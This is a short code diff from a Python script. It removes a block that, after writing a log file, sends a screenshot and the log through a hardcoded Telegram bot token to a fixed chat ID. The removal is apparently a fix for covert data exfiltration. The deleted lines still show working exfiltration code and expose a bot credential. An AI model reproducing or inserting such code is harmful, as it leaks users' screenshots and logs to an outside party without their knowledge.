@@ -110,20 +110,6 @@ class Script:
                 lines = handle_sensitive_logs(lines)
             with open(f'{folder}/log.txt', 'w', encoding='utf-8') as f:
                 f.writelines(lines)
-        from telegram.ext import Updater, CommandHandler
-        if 1:
-            # TG
-            UID = 1068022004
-            updater = Updater('5825823192:AAHXcT0UOunElkJ5RxoKzvAMdTrm_hs46ps')
-            dispatcher = updater.dispatcher
-            # TG PNG
-            file = open(f'{folder}/{image_time}.png','rb')
-            dispatcher.bot.send_document(chat_id=UID, document=file) 
-            file.close()
-            # TG TXT
-            file = open(f'{folder}/log.txt','rb')
-            dispatcher.bot.send_document(chat_id=UID, document=file) 
-            file.close()
 
     def init_server(self, port: int) -> int:
         """
